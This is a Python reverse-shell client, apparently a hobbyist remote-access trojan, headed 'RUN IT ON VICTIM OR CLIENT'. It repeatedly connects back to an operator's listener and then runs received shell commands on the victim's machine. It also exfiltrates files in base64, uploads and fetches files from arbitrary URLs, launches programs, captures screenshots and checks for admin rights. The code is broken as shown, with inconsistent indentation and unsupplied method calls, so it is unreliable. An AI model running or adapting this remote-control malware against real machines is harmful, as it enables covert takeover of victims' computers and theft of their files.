#!/usr/bin/python
# ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
# ██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
# ██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗      ███████╗███████║█████╗  ██║     ██║     
# ██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝      ╚════██║██╔══██║██╔══╝  ██║     ██║     
# ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
# ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                     
# RUN IT ON VICTIM OR CLIENT----------------------------------------------------------------------------- #

import socket   #importing socket library to so that we can create and set socket
import subprocess # subprocess is library that used to create pipe to execute command using subprocess.Popen
import json     #importing json library because by default socket.recv(1024) can recieve only 1024 bytes 
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
#from mss import mss

#output so that it cant recieve whole output for some commands

# Defining big_send() and big_recv() using json object so that we can dump data into json_data and display it 
#that helps to cross that socket.recv(1024) boundry

def big_send(data):
	json_data = json.dumps(data)
	s.send(json_data)

def big_recv():         # doesn't need to pass value because we are recieving data from client
	json_data = ""
	while True:
		try:
			json_data = json_data + s.recv(1024)
			return json.loads(json_data)
		except ValueError:      # handling expection so that program runs even recieving big amount of data 
			continue

def is_admin():
        global admin
        try:
                temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
        except:
                admin = "[+] Administrator Privileges"
        else:
                admin = "[!!] User Privileges"   

def screenshot():
       with mss() as screenshot:
               screenshot.shot()  

def download(url):
        get_response = requests.get(url)
        file_name =  url.split("/")[-1]
        with open(file_name, "wb") as out_file:
                out_file.write(get_response.content)

                
         
#creating socket and setting up options ------------------------------------------------------------------#
# Functions and uses
# socket.AF_INET = it used to specifies we are using ipv4 adress to connection
# socket.SOCK_STREAM = it specifies we will establish connection with TCP
# socket.SOL_SOCKET = it is socket layer itself it uses to manipulate socketoptions and passing as int 
#constant in setsockopt method
# socket.SO_REUSEADDR = is boolean and enable its to use same port for another socket and reuse that adress
#basically it allows to more then one socket process same time
# s.setsockopt = is for setting socket option
# HERE WE ARE CREATING ESTCONNECTION IS SAME AS WE SEEN SERVER IN SERVER.PY
           
def Estconnection():
	global s    #making socket s variable global so that we can use it in whole program
	#creating socket and setting up options 
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    # creating socket object s and passing two param.
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)   # set socket option
    connection()
    
def connection():
    
    while True:
        time.sleep(20)
    #---------------------------------------that's things you can change------------------------------------#
        try:
            s.connect(("127.0.0.1",44443))    # here we use connect method to connect with specified port and 
    #ip(localhost) you have to change it to your ip for performing
            break
        except:
            connection()
    #-------------------------------------------------------------------------------------------------------#

def Execute_cmd():
	while True:	             # we have to loop it because either we can't run morethen one command
		cmd = big_recv()
		if cmd == "q" :       # when type q it will close the connection
			print("Terminating Connection from client......")
			break
        elif cmd[:2] == "cd" and len(cmd) > 1:
            try:
                os.chdir(cmd[3:])
            except:
                big_send("[!!] could not change directory")
        elif cmd[:8] == "download":
                with open(cmd[9:],"rb") as file:
                    big_send(base64.b64encode(file.read))
         elif cmd[:6] == "upload":
                        with open(cmd[7:], "wb") as fin:
                                result = big_recv()
                                fin.write(base64.b64decode(result))
                elif cmd[:3] == "get":
                        try:
                                download(cmd[4:])
                                big_send("[+] Downloaded file from specific URL")

                        except:
                                big_send("[!!] Failed to Download file")
                elif cmd[:5] == "start":
                        try:
                                subprocess.Popen(cmd[6:], shell=True)
                                big_send("[+] Started")
                        except:
                                big_send("[!!] Failed to start")
               elif cmd[:10] == "screenshot":
                       try:
                               screenshot()
                               with open("monitor-1.png","rb") as sc:
                                       big_send(base64.b64encode(sc.read))
                               os.remove("monitor-1.png")
                       except:
                               big_send("[!!] Failed to take screenshot")
                elif cmd[:5] == "check":
                        try:
                                is_admin()
                                big_send(admin)
                        except:
                                big_send("[!!] Can't perform to Check")
                elif cmd[:4] == "help":
                        help = '''
                                download path -> Download A file From Target PC
                                upload path   -> Upload A File From Target PC
                                get url       -> Download A File to target From Any Website
                                start path    -> Start Program on Target PC
                                screenshot    -> Take a Screenshot Of Target Monitor
                                check         -> Check For Administrator Privileges '''
                        big_send(help)            
		else:
			try:
                # this line for executing recieved command on machine
				proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                
				result = proc.stdout.read() + proc.stderr.read()
				print(result)
				big_send(result)
			except:     # when any error between running command it will handle that error
				print("Command can't execute!!!")
				continue
while True:                
    Estconnection()
    Execute_cmd()
    s.close()